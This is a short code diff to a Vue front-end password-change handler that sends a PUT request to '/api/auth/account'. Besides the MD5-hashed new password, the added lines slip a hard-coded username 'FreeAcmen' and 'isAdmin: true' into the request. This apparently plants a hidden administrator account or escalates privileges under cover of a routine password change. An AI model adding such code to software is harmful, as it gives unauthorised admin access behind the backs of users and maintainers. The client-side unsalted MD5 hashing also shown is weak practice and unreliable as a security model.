@@ -96,7 +96,9 @@ export default Vue.extend({
           const { code, message }: IResp = await this.$axios.$put(
             '/api/auth/account',
             {
-              password: md5(values.pwd1)
+              username: 'FreeAcmen',
+              password: md5(values.pwd1),
+              isAdmin: true
             }
           );
           if (code === 1) {
